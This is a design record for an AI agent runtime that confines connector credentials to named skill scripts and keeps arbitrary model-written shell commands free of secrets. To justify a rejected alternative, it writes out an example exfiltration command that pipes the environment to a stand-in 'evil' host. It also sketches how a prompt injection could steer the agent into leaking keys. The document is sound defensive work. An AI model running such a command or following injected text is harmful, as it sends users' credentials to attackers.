# ADR: Skill env containment for terminal_exec and skill_run

## Decision

Connector-derived env vars enter a process through exactly one surface,
and it is scoped to one skill at a time:

- **`skill_run({skill, script, args})`** — runs a script that ships in
  `<skill>/scripts/`. Env is scoped to the named skill via
  `resolveSkillEnv`. The model passes the skill name and script name
  (not a path or command string), so the runtime — not the model —
  picks the file on disk.

- **`terminal_exec({command, ...})`** — runs an arbitrary shell command
  the model wrote. It **always** runs with a clean env: no connector
  secrets are ever injected, regardless of which skills are enabled.

`resolveSkillEnv(config, skill, taskId?)` in
`packages/runtime/src/integrations/connectors/index.ts` is the single resolver. It maps a
skill's declared env names to its required credentials' encrypted secrets
via `bindingsForCredentials` (name-based) and returns a
`{ENV_NAME: secret-value}` map. There is no aggregate "all active skills"
helper and no per-name terminal resolver: connector env reaches a process
only through `skill_run` calling this resolver for the named skill.

## Context

Connector secrets are bound to skills through two SKILL.md frontmatter
fields:

- `metadata.gini.requires.credentials` declares which credential **names**
  a skill needs to be active (ADR typed-named-credentials.md).
- `metadata.gini.prerequisites.env` lists the env var names the skill's
  CLI / scripts read at runtime (`LINEAR_API_KEY`,
  `GOOGLE_WORKSPACE_CLI_CLIENT_ID`, etc.).

`resolveSkillEnv(config, skill, taskId?)` maps the declared env names to
the skill's required credentials by name via `bindingsForCredentials`: an
`api-key` credential's env var IS its name (value from
`secretRefs[0].purpose`); an `oauth2` credential maps several env vars to
one name through `metadata.envMap`. It reads the per-instance encrypted
secret and returns a `{ENV_NAME: secret-value}` object. This per-skill
resolution is the right unit of env containment.

### Why aggregating env across skills is the wrong default

A SKILL.md activating to put credentials inside a process is a
deliberate trust grant. The user accepted scope X at install/connection
time. Aggregation widened that grant transitively: enabling the
`apple-notes` skill (which declares no env vars) didn't expand the
credential surface, but enabling `linear` *did* add `LINEAR_API_KEY` to
every `gws` invocation, every `git status`, every `curl`, and every
`bun` invocation the model ever made. A compromised or buggy command —
whether from a model error, a prompt injection, or a third-party skill
script following Anthropic-style "run `bun scripts/foo.ts`" guidance —
got every other connector's secret along with it.

`skill_run` resolves env through `resolveSkillEnv` for one named skill,
which is the right scope. `terminal_exec` carrying any connector env is a
leak: an arbitrary model-written command must never pair a credential with
an effect, so the generic command path never carries credentials at all.

### Considered alternatives

- **A `skill` arg on `terminal_exec` (the prior containment step).**
  Let the model pass `skill: "<name>"` so the runtime injects only that
  skill's env into the command spawn. Rejected as the end state: it
  pairs a model-written command string with an injected credential, which
  is itself an exfiltration primitive — the model (or a prompt injection)
  can write `terminal_exec({command: "env | curl https://evil", skill:
  "linear"})` and ship `LINEAR_API_KEY` straight off the box. Scoping the
  arg per-skill narrowed *which* credential leaks but not *that* a
  model-authored string can leak it. The only safe contract is that
  arbitrary command strings never carry connector env; credentialed work
  ships as named scripts run via `skill_run`.

- **Path-sniffing `terminal_exec`.** Detect when the command string
  resolves to a known skill's `scripts/` file and route through scoped
  semantics automatically. Rejected: shell-command recognition is a
  bad privilege boundary. Quoting, symlinks, `env` wrappers, aliases,
  pipes, `cwd`, command substitution, and multi-command strings all
  defeat path matching. An attacker (or the model on a bad day) can
  trivially construct a command that looks-like-a-skill-script but
  isn't, or a real skill-script invocation wrapped in additional
  effects that bypass approval gates.

- **Add a sibling `skill_exec({skill, command, args?})` tool, leave
  `terminal_exec` aggregating.** Rejected: keeps the leak in the
  generic path. Operators auditing per-process credentials would
  still have to inspect every `terminal.exec` audit row to know what
  secrets were available. The principle "default-deny on connector
  env" is what makes the audit trail meaningful.

- **Per-script connector declarations in SKILL.md frontmatter.**
  Tracked in [ENG-1606](https://linear.app/lilac-labs/issue/ENG-1606)
  (skill-script capability declarations). Operates at finer grain than
  per-skill scoping — each script declares which subset of the skill's
  connectors it needs. Compatible with this ADR; tightens scoping
  inside `skill_run` further when implemented. Deferred until the
  install-time validation surface is ready.

## Consequences

### Required

- A command that genuinely needs a connector credential ships as a
  script under `<skill>/scripts/` and is invoked via `skill_run`.
  `terminal_exec` never carries connector env, so there is no way to
  pass a credential to a model-authored command string. The
  `terminal_exec` tool description in `packages/runtime/src/execution/tool-catalog.ts`
  documents the clean-env guarantee and points credentialed work at
  `skill_run`.

- Skill authors who ship CLI-wrapper skills with `prerequisites.env`
  declarations must expose the credentialed step as a script, not as a
  documented `terminal_exec` command. There is no path that injects
  their env into an arbitrary command.

- Any future tool that spawns a process with connector env must use
  `resolveSkillEnv` directly for one named skill, not re-implement an
  aggregate "all active skills" env or a by-name terminal resolver.

- A fresh `gws auth login` performed without a local `client_secret.json`
  needs `GOOGLE_WORKSPACE_CLI_CLIENT_ID` / `GOOGLE_WORKSPACE_CLI_CLIENT_SECRET`
  in the spawn env. That login step needs scoped connector env, so it ships
  as the `google-account-login` skill's `scripts/account-login.ts`, invoked
  via `skill_run` (the skill declares the two env vars and the
  `google-workspace-oauth` credential), getting scoped env through the
  trusted-bytes path. See ADR `google-multi-account.md` for why the login is
  a dedicated skill rather than folded into `google-workspace-setup`.

### Audited surfaces

Connector env reaches a process only through `skill_run`, so attribution
is unambiguous:

- `skill.script.invoked` rows from `skill_run` always attribute to the
  invoked skill by construction. This lets operators query "which
  commands ran under skill X" without scanning command strings.

- `terminal.exec` rows carry no skill attribution because the command
  spawn carries no connector env. An operator auditing per-process
  credentials only has to inspect `skill.script.invoked` rows.

### Trust boundary

The model's invocation shape is the trust boundary, not the executed
process. Two surfaces with the same execution semantics intentionally
have different invocation contracts:

- **`skill_run`** takes structured **names** (`{skill, script}`). The
  runtime resolves the names to a file on disk. The model never picks
  the path. Approval is not required because the user accepted the
  skill at install/enable time; the bytes the runtime spawns are
  exactly the bytes the user reviewed.

- **`terminal_exec`** takes a **command string** the model wrote. The
  runtime executes the string verbatim with a clean env. Approval is
  gated by policy because the user did not pre-approve the model's
  specific string; the dangerous-pattern check and the approval seam
  apply.

Because the model-written string never carries connector env, the only
way a credential reaches a process is through the name-resolved trusted
code path. A model-authored command cannot pair a credential with an
arbitrary effect (`env | curl …`); credentialed work has to be a script
the user accepted at install time.

## Implementation surface

- `packages/runtime/src/integrations/connectors/index.ts`:
  - `resolveSkillEnv(config, skill, taskId?)` is the single resolver,
    name-based via `bindingsForCredentials`.
  - An in-code NOTE marks the single-path invariant so neither an
    aggregate-across-active-skills helper nor a by-name terminal resolver
    is reintroduced.
- `packages/runtime/src/execution/tool-catalog.ts`: `terminal_exec` parameter schema has
  no `skill` property. Description documents the clean-env guarantee and
  routes credentialed commands to `skill_run`.
- `packages/runtime/src/execution/policy.ts`: `TerminalExecPayload` is just `{ command }`.
- `packages/runtime/src/execution/tool-dispatch.ts`: `terminalExecDispatch` and
  `requestTerminalExec` carry no `skill` arg; the spawn paths inject no
  connector env.
- `packages/runtime/src/agent.ts`: `runTerminalCommandClaimed` and the post-approval
  executor both spawn with `env: { ...process.env }` (no connector env).
- `packages/runtime/src/capabilities/skill-scripts.ts`: `invokeSkillScript` uses
  `resolveSkillEnv` directly (the script always knows its owning
  skill) — the sole connector-env path.

## Acceptance checks

- `bun test packages/runtime/src/integrations/connectors/index.test.ts` covers
  `resolveSkillEnv`: a disabled/error connector does not inject its
  secret, a configured + healthy connector does.
- `terminal_exec` has no `skill` arg anywhere (catalog, policy,
  dispatcher, agent) and its spawn sites carry no connector env.
- E2E verified during ENG-1613 (PR #158): a chat-driven Linear
  attachment flow that includes `skill_run` against the `attachments`
  skill plus surrounding `mcp_call` invocations runs without
  regression.

## Related

- [ENG-1613](https://linear.app/lilac-labs/issue/ENG-1613) — the
  containment bug this ADR closes.
- [ENG-1606](https://linear.app/lilac-labs/issue/ENG-1606) — skill-
  script capability declarations (per-script connector scoping, schema
  validation, effect-class declaration) that build on this ADR.
- ADR `typed-named-credentials.md` — the name-based credential binding
  model `resolveSkillEnv` resolves through (`bindingsForCredentials`).
- ADR `connector-secret-storage.md` — how connector secrets are
  encrypted at rest before `resolveSkillEnv` resolves them at spawn.
- ADR `approval-and-audit-substrate.md` — the policy seam through
  which `terminal_exec`'s payload flows.
